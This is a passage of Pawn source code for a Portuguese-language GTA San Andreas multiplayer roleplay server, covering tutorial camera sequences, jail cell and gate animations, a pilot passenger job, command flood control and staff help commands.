				InterpolateCameraLookAt(playerid, 1637.9990, -1327.9093, 17.4531, 1552.2196, -1674.9835, 16.1907, 7000);
				SetTimerEx("TutorialText", 7000, false, "id", playerid, 4);
				TutoID[playerid] = 4;
			    return 1;
			}
			else if(TutoID[playerid] == 6)
			{
			    if(TutoLiberado[playerid] == false) return GameTextForPlayer(playerid, "~r~Aguarde alguns segundos...", 3000, 5);
				HideTutorial(playerid);
			    CancelSelectTextDraw(playerid);
				InterpolateCameraPos(playerid, 1196.1722, -1307.4220, 15.4933, 1613.8163, -1306.3540, 29.3279, 7000);
				InterpolateCameraLookAt(playerid, 1161.3822, -1333.9138, 18.5351, 1637.9990, -1327.9093, 17.4531, 7000);
				SetTimerEx("TutorialText", 7000, false, "id", playerid, 5);
				TutoID[playerid] = 5;
			    return 1;
			}
			else if(TutoID[playerid] == 7)
			{
			    if(TutoLiberado[playerid] == false) return GameTextForPlayer(playerid, "~r~Aguarde alguns segundos...", 3000, 5);
				HideTutorial(playerid);
			    CancelSelectTextDraw(playerid);
				InterpolateCameraPos(playerid, 1956.1354, -1788.3785, 15.0142, 1196.1722, -1307.4220, 15.4933, 7000);
				InterpolateCameraLookAt(playerid, 1926.6771, -1768.3055, 13.5469, 1161.3822, -1333.9138, 18.5351, 7000);
				SetTimerEx("TutorialText", 7000, false, "id", playerid, 6);
				TutoID[playerid] = 6;
			    return 1;
			}
			else if(TutoID[playerid] == 8)
			{
			    if(TutoLiberado[playerid] == false) return GameTextForPlayer(playerid, "~r~Aguarde alguns segundos...", 3000, 5);
				HideTutorial(playerid);
			    CancelSelectTextDraw(playerid);
				InterpolateCameraPos(playerid, 1107.4972, -1481.1316, 36.1059, 1956.1354, -1788.3785, 15.0142, 7000);
				InterpolateCameraLookAt(playerid, 1169.7773, -1489.6646, 22.7560, 1926.6771, -1768.3055, 13.5469, 7000);
				SetTimerEx("TutorialText", 7000, false, "id", playerid, 7);
				TutoID[playerid] = 7;
			    return 1;
			}
			else if(TutoID[playerid] == 9)
			{
			    if(TutoLiberado[playerid] == false) return GameTextForPlayer(playerid, "~r~Aguarde alguns segundos...", 3000, 5);
				HideTutorial(playerid);
			    CancelSelectTextDraw(playerid);
				InterpolateCameraPos(playerid, 2247.6531, -1654.9840, 17.5291, 1107.4972, -1481.1316, 36.1059, 7000);
				InterpolateCameraLookAt(playerid, 2239.4626, -1673.6244, 16.4082, 1169.7773, -1489.6646, 22.7560, 7000);
				SetTimerEx("TutorialText", 7000, false, "id", playerid, 8);
				TutoID[playerid] = 8;
			    return 1;
			}
			else if(TutoID[playerid] == 10)
			{
			    if(TutoLiberado[playerid] == false) return GameTextForPlayer(playerid, "~r~Aguarde alguns segundos...", 3000, 5);
				HideTutorial(playerid);
			    CancelSelectTextDraw(playerid);
				InterpolateCameraPos(playerid, 1228.8658, -940.3342, 59.0947, 2247.6531, -1654.9840, 17.5291, 7000);
				InterpolateCameraLookAt(playerid, 1201.2402, -917.3168, 48.0625, 2239.4626, -1673.6244, 16.4082, 7000);
				SetTimerEx("TutorialText", 7000, false, "id", playerid, 9);
				TutoID[playerid] = 9;
			    return 1;
			}
		}
		if(NoTuto[playerid] == false)
		{
			KillTimer(timerarms[playerid]);
		    PlayerTextDrawHide(playerid, _INFO[playerid]);
	 	   	PlayerTextDrawHide(playerid, _ICONE[playerid]);
	    	PlayerTextDrawHide(playerid, _MSGFORM[playerid]);
		    PlayerTextDrawHide(playerid, _ACEITAR[playerid]);
		    PlayerTextDrawHide(playerid, _RECUSAR[playerid]);
		    PlayerTextDrawHide(playerid, _MSGTEMPO[playerid]);
			CancelSelectTextDraw(playerid);
			compraArm[playerid] = -1;
			compraArm[compraArm[playerid]] = -1;
			preccArma[playerid] = -1;
			preccArma[preccArma[playerid]] = -1;
			armaEscol[playerid] = -1;
			armaEscol[armaEscol[playerid]] = -1;
			temptemp_[playerid] = -1;
		}
		else SelectTextDraw(playerid, 0x9C9C9CAA);
		return true;
}

HideTutorial(playerid)
{
	Loop(i, 6)
	{
		PlayerTextDrawHide(playerid, TutoText[playerid][i]);
	}
}

//Chat
stock GetName(playerid, bool:tipo)
{
        new nome[MAX_PLAYER_NAME];
        GetPlayerName(playerid, nome, sizeof(nome));
        if(tipo == true)
        {
        	for(new i = 0; i < MAX_PLAYER_NAME; i++)
            {
                if(nome[i] == '_') nome[i] = ' ';
            }
        }
        return nome;
}

/*forward ProxDetectorChat(Float:radi, playerid, strings[],col1,col2,col3,col4,col5);
public ProxDetectorChat(Float:radi, playerid, strings[],col1,col2,col3,col4,col5)
{
	new axll@string[128];
    if(IsPlayerConnected(playerid))
    {
        new Float:posx, Float:posy, Float:posz;
        new Float:oldposx, Float:oldposy, Float:oldposz;
        new Float:tempposx, Float:tempposy, Float:tempposz;
        GetPlayerPos(playerid, oldposx, oldposy, oldposz);
        for(new i = 0; i < MAX_PLAYERS; i++)
        {
            if(IsPlayerConnected(i) && (GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(i)))
            {
                GetPlayerPos(i, posx, posy, posz);
                tempposx = (oldposx -posx);
                tempposy = (oldposy -posy);
                tempposz = (oldposz -posz);
                if (((tempposx < radi/16) && (tempposx > -radi/16)) && ((tempposy < radi/16) && (tempposy > -radi/16)) && ((tempposz < radi/16) && (tempposz > -radi/16))) // If the player is within 16 meters
                {
                    SendClientMessage(i, col1, strings);
                }
                else if (((tempposx < radi/8) && (tempposx > -radi/8)) && ((tempposy < radi/8) && (tempposy > -radi/8)) && ((tempposz < radi/8) && (tempposz > -radi/8))) // within 8 meters
                {
                    SendClientMessage(i, col2, strings);
                }
                else if (((tempposx < radi/4) && (tempposx > -radi/4)) && ((tempposy < radi/4) && (tempposy > -radi/4)) && ((tempposz < radi/4) && (tempposz > -radi/4))) //4 meters
                {
                    SendClientMessage(i, col3, strings);
                }
                else if (((tempposx < radi/2) && (tempposx > -radi/2)) && ((tempposy < radi/2) && (tempposy > -radi/2)) && ((tempposz < radi/2) && (tempposz > -radi/2))) //2 meters
                {
                    SendClientMessage(i, col4, strings);
                }
                else if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi))) //1 meter
                {
                    SendClientMessage(i, col5, strings);
                }
            }
            else
            {
                SendClientMessage(i, col1, axll@string);
            }
        }
    }
    return 1;
}*/

forward DescerElevador();
public DescerElevador()
{
	MoveObject(elevadordp, 1570.57593, -1655.18555, 2.98000, 3.0,   0.00000, 0.00000, 90.00000);
	return 1;
}

forward AbrirElevador();
public AbrirElevador()
{
    MoveObject(portaelevador[0],1572.11816, -1655.40735, 17.12820, 3.0,  0.00000, 0.00000, 90.00000);
	MoveObject(portaelevador[1],1567.10999, -1655.41528, 17.12820, 3.0,  0.00000, 0.00000, 90.00000);
	return 1;
}

forward FecharElevador();
public FecharElevador()
{
	MoveObject(portaelevador[0],1570.55994, -1655.40735, 17.12820, 3.0,  0.00000, 0.00000, 90.00000);
	MoveObject(portaelevador[1],1568.63159, -1655.41528, 17.12820, 3.0,  0.00000, 0.00000, 90.00000);
	return 1;
}

forward AbrirCelas();
public AbrirCelas()
{
	MoveObject(celas[5],1575.19885, -1669.15137, 7.38000, 3.0,  0.00000, 0.00000, 90.00000);
	MoveObject(celas[6],1571.24878, -1669.21191, 7.38000, 3.0,  0.00000, 0.00000, 90.00000);
	MoveObject(celas[7],1567.22485, -1669.18213, 7.38000, 3.0,  0.00000, 0.00000, 90.00000);
	MoveObject(celas[8],1563.20569, -1669.21423, 7.38000, 3.0,  0.00000, 0.00000, 90.00000);
	MoveObject(celas[9],1559.34863, -1669.20935, 7.38000, 3.0,  0.00000, 0.00000, 90.00000);
	MoveObject(celas[4],1574.94946, -1669.19104, 3.47870, 3.0,  0.00000, 0.00000, 90.00000);
	MoveObject(celas[3],1570.95483, -1669.18750, 3.47870, 3.0,  0.00000, 0.00000, 90.00000);
	MoveObject(celas[2],1567.03455, -1669.21985, 3.47870, 3.0,  0.00000, 0.00000, 90.00000);
	MoveObject(celas[1],1563.10535, -1669.19934, 3.47870, 3.0,  0.00000, 0.00000, 90.00000);
	MoveObject(celas[0],1559.13611, -1669.14612, 3.47870, 3.0,  0.00000, 0.00000, 90.00000);
	SetTimer("FecharCelas",900000,false);
	SetTimer("AvisoVoltar",780000,false);
	return 1;
}

forward FecharCelas();
public FecharCelas()
{
	MoveObject(celas[0],1560.83679, -1669.16003, 3.47870, 3.0,  0.00000, 0.00000, 90.00000);
	MoveObject(celas[1],1564.82568, -1669.21387, 3.47870, 3.0,  0.00000, 0.00000, 90.00000);
	MoveObject(celas[2],1568.75757, -1669.22327, 3.47870, 3.0,  0.00000, 0.00000, 90.00000);
	MoveObject(celas[3],1572.67529, -1669.17993, 3.47870, 3.0,  0.00000, 0.00000, 90.00000);
	MoveObject(celas[4],1576.65149, -1669.19653, 3.47870, 3.0,  0.00000, 0.00000, 90.00000);
	MoveObject(celas[5],1576.86096, -1669.15967, 7.38000, 3.0,  0.00000, 0.00000, 90.00000);
	MoveObject(celas[6],1572.92981, -1669.19897, 7.38000, 3.0,  0.00000, 0.00000, 90.00000);
	MoveObject(celas[7],1568.94568, -1669.16846, 7.38000, 3.0,  0.00000, 0.00000, 90.00000);
	MoveObject(celas[8],1564.92993, -1669.20435, 7.38000, 3.0,  0.00000, 0.00000, 90.00000);
	MoveObject(celas[9],1561.06873, -1669.19714, 7.38000, 3.0,  0.00000, 0.00000, 90.00000);
	SetTimer("AbrirCelas",2700000,false);
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(pInfo[i][Preso] > 0)
	    {
	        if(!IsPlayerInRangeOfPoint(i,5.0,1562.0298,-1671.2778,5.8066) || !IsPlayerInRangeOfPoint(i,5.0,1565.9313,-1671.7671,5.8066) || !IsPlayerInRangeOfPoint(i,5.0,1569.8096,-1671.9797,5.8066) ||
			!IsPlayerInRangeOfPoint(i,5.0,1573.8180,-1672.3195,5.8066) || !IsPlayerInRangeOfPoint(i,5.0,1577.6306,-1672.3116,5.8066) || !IsPlayerInRangeOfPoint(i,5.0,1577.6334,-1672.2010,2.0466) ||
			!IsPlayerInRangeOfPoint(i,5.0,1573.4969,-1672.2004,2.0466) || !IsPlayerInRangeOfPoint(i,5.0,1569.5760,-1672.4891,2.0466) || !IsPlayerInRangeOfPoint(i,5.0,1565.8594,-1671.9883,2.0466) ||
			!IsPlayerInRangeOfPoint(i,5.0,1561.6692,-1671.9108,2.0466))
         	{
	        	SendClientMessage(i,COR_AMARELO,"Você não voltou para a sua cela e permanecerá por mais 7,5 minutos presos. Os policiais foram alertados!");
	        	pInfo[i][Preso] = pInfo[i][Preso] + 450;
	        	SendCellCopsMSG();
				return 1;
			}
	        return 1;
		}
		return 1;
	}
	return 1;
}

forward AvisoVoltar();
public AvisoVoltar()
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(pInfo[i][Preso] > 0)
	    {
	        SendClientMessage(i,COR_AMARELO,"Você tem 2 minutos para voltar as celas, caso contrário será punido(a)!");
	        //Progress ou gametext contando
	        return 1;
		}
		return 1;
	}
	return 1;
}

forward FecharPCelas();
public FecharPCelas()
{
    MoveObject(portacelas,1566.94397, -1658.47510, 3.47870, 3.0,  0.00000, 0.00000, 0.00000);
    return 1;
}

forward FecharPortaoDP();
public FecharPortaoDP()
{
	MoveObject(PortaoDP,1588.72571, -1638.08118, 14.48900, 0.5,  0.00000, 0.00000, 90.00000);
	return 1;
}

forward FecharCancelaDP();
public FecharCancelaDP()
{
	MoveObject(CancelaDP,1544.67395, -1630.98694, 13.07270, 0.0001,  0.00000, 90.00000, 90.00000);
	return 1;
}

stock SendCellCopsMSG()
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(getPolicial(i))
	    {
	        SendClientMessage(i,COR_ERRO,"Há um preso fora das celas, vá verificar!");
	        return 1;
		}
		return 1;
	}
	return 1;
}

stock GivePlayerAmmo(playerid, weaponslot, ammo)
{
	new ammocount = GetPlayerAmmo(playerid);
	SetPlayerAmmo(playerid, weaponslot, ammo+ammocount);
	return 1;
}

forward MoveCancela1(playerid);
public MoveCancela1(playerid)
{
	MovePlayerObject(playerid, CancelaP[playerid][0], 56.05, -1528.62, 4.67+0.0001, 0.0001, 0.0000, 0.0000, 262.0000);
	TogglePlayerControllable(playerid, true);
	SetTimerEx("FecharCancelaP", 3000, false, "i", playerid);
	SetTimerEx("PassouPedagioP", 4000, false, "i", playerid);
	return 1;
}

forward MoveCancela2(playerid);
public MoveCancela2(playerid)
{
	MovePlayerObject(playerid, CancelaP[playerid][1], 56.05, -1535.82, 4.71+0.0001, 0.0001, 0.0000, 0.0000, 262.0000);
	TogglePlayerControllable(playerid, true);
	SetTimerEx("FecharCancelaP", 3000, false, "i", playerid);
	SetTimerEx("PassouPedagioP", 4000, false, "i", playerid);
	return 1;
}

forward MoveCancela3(playerid);
public MoveCancela3(playerid)
{
	MovePlayerObject(playerid, CancelaP[playerid][2], 1741.48804, 520.73932, 27.95000,   0.00000, 90.00000, -19.36600);
	TogglePlayerControllable(playerid, true);
	SetTimerEx("FecharCancelaP", 3000, false, "i", playerid);
	SetTimerEx("PassouPedagioP", 4000, false, "i", playerid);
	return 1;
}

forward MoveCancela4(playerid);
public MoveCancela4(playerid)
{
	MovePlayerObject(playerid, CancelaP[playerid][3], 1733.18848, 517.22089, 28.16000,   0.00000, 90.00000, -199.51997);
	TogglePlayerControllable(playerid, true);
	SetTimerEx("FecharCancelaP", 3000, false, "i", playerid);
	SetTimerEx("PassouPedagioP", 4000, false, "i", playerid);
	return 1;
}

forward PassouPedagioP(playerid);
public PassouPedagioP(playerid)
{
	PassouPedagio[playerid] = false;
	return 1;
}

forward FecharCancelaP(playerid);
public FecharCancelaP(playerid)
{
	MovePlayerObject(playerid, CancelaP[playerid][0], 56.05, -1528.62, 4.67, 0.0001, 0.0000, 270.0000, 262.0000);
	MovePlayerObject(playerid, CancelaP[playerid][1], 56.05, -1535.82, 4.71, 0.0001, 0.0000, 90.0000, 262.0000);
	MovePlayerObject(playerid, CancelaP[playerid][2], 1741.48804, 520.73932, 27.95000, 0.0001,  0.00000, 90.00000, -19.36600);
	MovePlayerObject(playerid, CancelaP[playerid][3], 1733.18848, 517.22089, 28.16000, 0.0001,  0.00000, 90.00000, -199.51997);
	return 1;
}

forward ProntoCasar(playerid);
public ProntoCasar(playerid)
{
	RequisitouCasar[playerid] = false;
	return 1;
}

@Callback: CarregarPassageiros(playerid, City)
{
	new String[128];
	if(City == 1)
	{
		if(ViagemPiloto[playerid] == 1)
		{
			if(PassageirosPiloto[playerid] == 10)
			{
			    SendClientMessage(playerid, COR_PILOTO, "O avião ficou lotado e você tem que decolar. Boa Viagem!");
				KillTimer(TimerPiloto[playerid]);
				TogglePlayerControllable(playerid, true);
				SetPlayerRaceCheckpoint(playerid, 1, 1560.7494, 1481.7505, 10.7424, 0.0, 0.0, 0.0, 10.0);
				return 1;
			}
			else
			{
				PassageirosPiloto[playerid] += 1;
			    format(String, sizeof(String), "~g~Recolhendo Passageiros... ~n~%d de 10", PassageirosPiloto[playerid]);
				GameTextForPlayer(playerid, String, 6000, 5);
			}
		}
		else if(ViagemPiloto[playerid] == 2)
		{
			if(PassageirosPiloto[playerid] == 15)
			{
			    SendClientMessage(playerid, COR_PILOTO, "O avião ficou lotado e você tem que decolar. Boa Viagem!");
				KillTimer(TimerPiloto[playerid]);
				TogglePlayerControllable(playerid, true);
				SetPlayerRaceCheckpoint(playerid, 1, 1560.7494, 1481.7505, 10.7424, 0.0, 0.0, 0.0, 10.0);
				return 1;
			}
			else
			{
				PassageirosPiloto[playerid] += 1;
			    format(String, sizeof(String), "~g~Recolhendo Passageiros... ~n~%d de 15", PassageirosPiloto[playerid]);
				GameTextForPlayer(playerid, String, 6000, 5);
			}
		}
		else if(ViagemPiloto[playerid] == 3)
		{
			if(PassageirosPiloto[playerid] == 25)
			{
			    SendClientMessage(playerid, COR_PILOTO, "O avião ficou lotado e você tem que decolar. Boa Viagem!");
				KillTimer(TimerPiloto[playerid]);
				TogglePlayerControllable(playerid, true);
				SetPlayerRaceCheckpoint(playerid, 1, 1560.7494, 1481.7505, 10.7424, 0.0, 0.0, 0.0, 10.0);
				return 1;
			}
			else
			{
				PassageirosPiloto[playerid] += 1;
			    format(String, sizeof(String), "~g~Recolhendo Passageiros... ~n~%d de 25", PassageirosPiloto[playerid]);
				GameTextForPlayer(playerid, String, 6000, 5);
			}
		}
		else if(ViagemPiloto[playerid] == 4)
		{
			if(PassageirosPiloto[playerid] == 40)
			{
			    SendClientMessage(playerid, COR_PILOTO, "O avião ficou lotado e você tem que decolar. Boa Viagem!");
				KillTimer(TimerPiloto[playerid]);
				TogglePlayerControllable(playerid, true);
				SetPlayerRaceCheckpoint(playerid, 1, 1560.7494, 1481.7505, 10.7424, 0.0, 0.0, 0.0, 10.0);
				return 1;
			}
			else
			{
				PassageirosPiloto[playerid] += 1;
			    format(String, sizeof(String), "~g~Recolhendo Passageiros... ~n~%d de 40", PassageirosPiloto[playerid]);
				GameTextForPlayer(playerid, String, 6000, 5);
			}
		}
	}
	else if(City == 1)
	{
		if(ViagemPiloto[playerid] == 5)
		{
			if(PassageirosPiloto[playerid] == 10)
			{
			    SendClientMessage(playerid, COR_PILOTO, "O avião ficou lotado e você tem que decolar. Boa Viagem!");
				KillTimer(TimerPiloto[playerid]);
				TogglePlayerControllable(playerid, true);
				SetPlayerRaceCheckpoint(playerid, 1, 1658.0150, -2456.1626, 13.4710, 0.0, 0.0, 0.0, 10.0);
				return 1;
			}
			else
			{
				PassageirosPiloto[playerid] += 1;
			    format(String, sizeof(String), "~g~Recolhendo Passageiros... ~n~%d de 10", PassageirosPiloto[playerid]);
				GameTextForPlayer(playerid, String, 6000, 5);
			}
		}
		else if(ViagemPiloto[playerid] == 6)
		{
			if(PassageirosPiloto[playerid] == 15)
			{
			    SendClientMessage(playerid, COR_PILOTO, "O avião ficou lotado e você tem que decolar. Boa Viagem!");
				KillTimer(TimerPiloto[playerid]);
				TogglePlayerControllable(playerid, true);
				SetPlayerRaceCheckpoint(playerid, 1, 1658.0150, -2456.1626, 13.4710, 0.0, 0.0, 0.0, 10.0);
				return 1;
			}
			else
			{
				PassageirosPiloto[playerid] += 1;
			    format(String, sizeof(String), "~g~Recolhendo Passageiros... ~n~%d de 15", PassageirosPiloto[playerid]);
				GameTextForPlayer(playerid, String, 6000, 5);
			}
		}
		else if(ViagemPiloto[playerid] == 7)
		{
			if(PassageirosPiloto[playerid] == 25)
			{
			    SendClientMessage(playerid, COR_PILOTO, "O avião ficou lotado e você tem que decolar. Boa Viagem!");
				KillTimer(TimerPiloto[playerid]);
				TogglePlayerControllable(playerid, true);
				SetPlayerRaceCheckpoint(playerid, 1, 1658.0150, -2456.1626, 13.4710, 0.0, 0.0, 0.0, 10.0);
				return 1;
			}
			else
			{
				PassageirosPiloto[playerid] += 1;
			    format(String, sizeof(String), "~g~Recolhendo Passageiros... ~n~%d de 25", PassageirosPiloto[playerid]);
				GameTextForPlayer(playerid, String, 6000, 5);
			}
		}
		else if(ViagemPiloto[playerid] == 8)
		{
			if(PassageirosPiloto[playerid] == 40)
			{
			    SendClientMessage(playerid, COR_PILOTO, "O avião ficou lotado e você tem que decolar. Boa Viagem!");
				KillTimer(TimerPiloto[playerid]);
				TogglePlayerControllable(playerid, true);
				SetPlayerRaceCheckpoint(playerid, 1, 1658.0150, -2456.1626, 13.4710, 0.0, 0.0, 0.0, 10.0);
				return 1;
			}
			else
			{
				PassageirosPiloto[playerid] += 1;
			    format(String, sizeof(String), "~g~Recolhendo Passageiros... ~n~%d de 40", PassageirosPiloto[playerid]);
				GameTextForPlayer(playerid, String, 6000, 5);
			}
		}
	}
	return 1;
}

@Callback: DescongelarPlayerPiloto(playerid, DescarregamentoID)
{
	new String[128];
	TogglePlayerControllable(playerid, 1);
	DisablePlayerRaceCheckpoint(playerid);
	format(String, sizeof(String), "Foi descarregado %d passageiro(s) e você ganhou R$%d!", PassageirosPiloto[playerid], PassageirosPiloto[playerid]*130);
	SendClientMessage(playerid, COR_PILOTO, String);
	sGivePlayerCash(playerid, PassageirosPiloto[playerid] * 130);
	ViagemPiloto[playerid] = 0;
	return 1;
}

/*public OnPlayerCommandPerformed(playerid, cmdtext[], success)
{
    if(!success)
	{
        new CmdString[256];
        format(CmdString, sizeof(CmdString), "O comando {FFFFFF}'%s'{FF0000} não existe. Utilize: {FFFFFF}/Ajuda {FF0000}ou {FFFFFF}/Comandos", cmdtext);
        SendClientMessage(playerid, COR_ERRO, CmdString);
    }
    return 1;
}*/

stock isNumeric(const string[])
{
	new length=strlen(string);
	if (length==0) return false;
	for (new i = 0; i < length; i++)
	{
		if (
			(string[i] > '9' || string[i] < '0' && string[i]!='-' && string[i]!='+')
			|| (string[i]=='-' && i!=0)
			|| (string[i]=='+' && i!=0)
		) return false;
	}
	if (length==1 && (string[0]=='-' || string[0]=='+')) return false;
	return true;
}
public OnPlayerCommandText(playerid, cmdtext[])
{
	///tunar de mecanico
	if(!strcmp( cmdtext, "/vtunar", true ))
	{
	    if(!(pInfo[ playerid ][ Prof ] == MECANICO || aInfo[ playerid ][ Admin ] == 1 || aInfo[ playerid ][ Moderador ] == 1))
	        return SendClientMessage(playerid,COR_AMARELO,"[INFO] Voce nao e um mecanico de carro !");

	    if(!IsPlayerInAnyVehicle(playerid))
	        return SendClientMessage(playerid,-1,"[INFO] Voce nao esta em um carro.");

	    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
	        return SendClientMessage(playerid,COR_AMARELO,"[INFO] Voce nao e o motorista do carro !");

	    new podesertunados[] =
	    {
	        562, 565, 559, 561, 560, 575, 534, 567, 536, 535, 576, 411, 579, 597, 602, 496, 518, 527, 589, 597, 419,
	        533, 526, 474, 545, 517,410, 600, 436, 580, 439, 549, 491, 445, 604, 507, 585, 587, 466, 492, 546, 551,
	        516, 467, 426, 547, 405, 409, 550, 566, 540, 421, 529, 431,438, 437, 420, 525, 552, 416, 433, 427, 490,
	        528, 407, 544, 470, 598, 596, 597, 599, 597, 601, 428, 499, 609, 524, 578, 486, 406, 573, 455,
	        588, 403, 514, 423, 414, 443, 456, 422, 482, 530, 418, 572, 413, 440, 543, 583, 554, 402, 542, 603,
	        475, 568, 504, 457, 483, 515, 508, 478,429, 541, 415, 480, 434, 506, 451, 555, 477, 400, 404, 489, 479, 442, 458, 558
	    };
	    new lelmodel = GetVehicleModel(GetPlayerVehicleID(playerid));
	    for(new i = 0; i < sizeof(podesertunados); i++)
	    {
	        if(lelmodel == podesertunados[i])
	        {
	            ShowMenuForPlayer(TuningMenu, playerid);
	            TogglePlayerControllable(playerid, false);
	        }
	    }
	    return 1;
	}
//------------------------------------------------------------------------------
    if(floodCMD[playerid][0] > gettime() && aInfo[playerid][Admin] != 1 && aInfo[playerid][Moderador] != 1)
	{
	  	if(floodCMD[playerid][1] >= 3)
		{
			format(gStr, 128, "Você poderá usar comandos em %d segundos!", floodCMD[playerid][0] - gettime());
			SendClientMessage(playerid, COR_ERRO, gStr);
			SendClientMessage(playerid, COR_ERRO, "Evite cometer flood no chat!");
			return 1;
		}
		if(floodCMD[playerid][1] <= 0)
	    {
	    	SendClientMessage(playerid, COR_ERRO, "Evite cometer flood no chat! (1° Aviso de 3)");
	    	floodCMD[playerid][1] = 1;
	    	floodCMD[playerid][0] = gettime() + 2;
	    	return 1;
		}
		if(floodCMD[playerid][1] == 1)
	    {
	    	SendClientMessage(playerid, COR_ERRO, "Evite cometer flood no chat! (2° Aviso de 3)");
	    	floodCMD[playerid][1] = 2;
	    	floodCMD[playerid][0] = gettime() + 3;
	    	return 1;
	    }
	  	if(floodCMD[playerid][1] == 2)
	    {
	    	SendClientMessage(playerid, COR_ERRO, "Evite cometer flood no chat! (3° Aviso de 3)");
	    	SendClientMessage(playerid, COR_ERRO, "Você excedeu o limite de avisos e ficará 1 minuto sem poder usar comandos!");
	    	floodCMD[playerid][1] = 3;
	    	floodCMD[playerid][0] = gettime() + 60;
	    	return 1;
	    }
	}
    floodCMD[playerid][0] = gettime() + 2;
    floodCMD[playerid][1] = 0;
    TempoAFK[playerid] = 0;

   	new
		cmd[128], tmp[128], str[128], string[128], MSG[128],
		giveplayerid, animeID, idx, sendername[MAX_PLAYER_NAME], giveplayer[MAX_PLAYER_NAME]
	;
	cmd = strtok(cmdtext, idx);

 	foreach(Player, i)
	{
  		if(aInfo[i][Admin] == 1 || aInfo[i][Moderador] == 1)
		{
		    if(vercmds[i] == 1)
		    {
		        if(aInfo[playerid][Admin] == 0 || aInfo[playerid][Moderador] == 0)
		        {
					format(gstring, sizeof(gstring), "%s [%d] digitou: %s", PlayerName(playerid), playerid, cmdtext);
					SendClientMessage(i, 0x00CCCCAA, gstring);
				}
			}
		}
	}
	if(pInfo[playerid][Preso] > 0 && strcmp(cmdtext, "/padvogado", true) != 0 && strcmp(cmd, "/reportar", true) != 0 && aInfo[playerid][Admin] == 0 && aInfo[playerid][Moderador] == 0)
	{
		SendClientMessage(playerid, COR_ERRO, "Você só poderá usar '/padvogado' e '/reportar' enquanto estiver preso!");
		return 1;
	}

	if(strcmp(cmdtext,"/sairafk", true) != 0 && pInfo[playerid][AFK] == true)
        return SendClientMessage(playerid, COR_AZULCLARO, "Você não pode usar comandos enquanto estiver AFK!"), 0;

	if(ComandosStatus == 1 && aInfo[playerid][Admin] == 0 && aInfo[playerid][Moderador] == 0 && aInfo[playerid][Ajudante] == 0 && aInfo[playerid][Corregedor] == 0)
	{
	    SendClientMessage(playerid, COR_ERRO, "Os comandos estão desativados!");
		return 1;
	}
	if(!strcmp(cmd, "/duvida", true))
	{
	    new
			gPM[128]
		;
		gPM = strrest(cmdtext, idx);
		if(!strlen(gPM))
		{
			SendClientMessage(playerid, COR_ERRO, "Uso válido: /Duvida [Mensagem]");
			return 1;
		}
	    if(Help[playerid] > gettime())
		{
		    format(gStr, sizeof(gStr), "Aguarde %d segundos para solicitar novamente à Adminstração / Moderação!", Help[playerid] - gettime());
		    SendClientMessage(playerid, COR_ERRO, gStr);
			return 1;
		}
        foreach(Player, i)
        {
			if(aInfo[i][Admin] == 1 || aInfo[i][Moderador] == 1 || aInfo[i][Ajudante] == 1 || aInfo[i][Corregedor] == 1)
		   	{
				SendClientFormat(i, COR_AMARELO, "%s [%i]: %s", PlayerName(playerid), playerid, gPM);
			}
		}
		SendClientMessage(playerid, AZUL_WE, "Pedido de ajuda/dúvida enviada, aguarde um(a) responsável responder.");
	    Help[playerid] = gettime() + 15;
		return 1;
	}
	if( !strcmp( cmd, "/rduvida", true ))
	{
		if( aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || aInfo[playerid][Ajudante] == 1 )
		{
			new
			gPM[ 128 ]
			;
			tmp = strtok( cmdtext, idx );
			if( !strlen( tmp ))
			{
				SendClientMessage( playerid, COR_ERRO, "Uso correto: '/RDuvida [ ID ] [ Mensagem ]" );
				return 1;
			}
			new
			id = strval( tmp )
			;
			gPM = strrest( cmdtext, idx );
			if( !strlen( gPM ))
			{
				SendClientMessage( playerid, COR_ERRO, "Uso correto: /RDuvida [ ID ] [ Mensagem ]" );
				return 1;
			}
			if( IsPlayerConnected( id ))
			{
				if( playerid != id )
				{
					foreach(Player, i )
					{
						if( aInfo[i][Admin] == 1 || aInfo[i][Moderador] == 1 || aInfo[i][Ajudante] == 1 )
						{
							format( gstring, sizeof( gstring ), "DUVIDA: %s[ %d ] ajuda %s[ %d ] dizendo: %s", PlayerName( playerid ), playerid, PlayerName( id ), id, gPM );
							SendClientMessage( i, 0xC3FF62FF, gstring );
						}
					}
					GameTextForPlayer( playerid, "~g~DUVIDA RESPONDIDA!", 2000, 4 );
					format( gstring, sizeof( gstring ), "DUVIDA: %s[ %d ] diz: %s", PlayerName( playerid ), playerid, gPM );
					SendClientMessage( id, 0xC3FF62FF, gstring );
					GameTextForPlayer( id, "~G~DUVIDA RESPONDIDA!", 2000, 4 );
					PlayerPlaySound( id, 1085, 0.0, 0.0, 0.0 );
					Help[ id ] = gettime( );
				}
				else
				{
					SendClientMessage( playerid, COR_ERRO, "Você não pode ajudar você mesmo !" );
				}
			}
			else
			{
				SendClientMessage( playerid, COR_ERRO, "Ninguém online com esse ID !" );
			}
		}
		return 1;
	}
	if(!strcmp(cmd, "/aj", true) || !strcmp(cmd, "/ajudar", true))
	{
	    if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || aInfo[playerid][Ajudante] == 1 || aInfo[playerid][Corregedor] == 1)
	    {
		    new
				gPM[128]
			;
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: '/Ajudar [ID] [Mensagem] ou /Aj [ID] [Mensagem]'.");
				return 1;
			}
			new
				id = strval(tmp)
			;
			gPM = strrest(cmdtext, idx);
			if(!strlen(gPM))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /SMS [ID] [Mensagem]");
				return 1;
			}
			if(IsPlayerConnected(id))
			{
				if(playerid != id)
				{
				    foreach(Player, i)
				    {
				        if(aInfo[i][Admin] == 1 || aInfo[i][Moderador] == 1 || aInfo[i][Ajudante] == 1 || aInfo[i][Corregedor] == 1)
				        {
          					format(gstring, sizeof(gstring), "%s [%d] ajuda %s [%d] respondendo: %s", PlayerName(playerid), playerid, PlayerName(id), id, gPM);
							SendClientMessage(i, AZUL_WE, gstring);
						}
					}
					GameTextForPlayer(playerid, "~w~AJUDA ENVIADA!", 2000, 4);
					format(gstring, sizeof(gstring), "%s [%d] responde sua dúvida: %s", PlayerName(playerid), playerid, gPM);
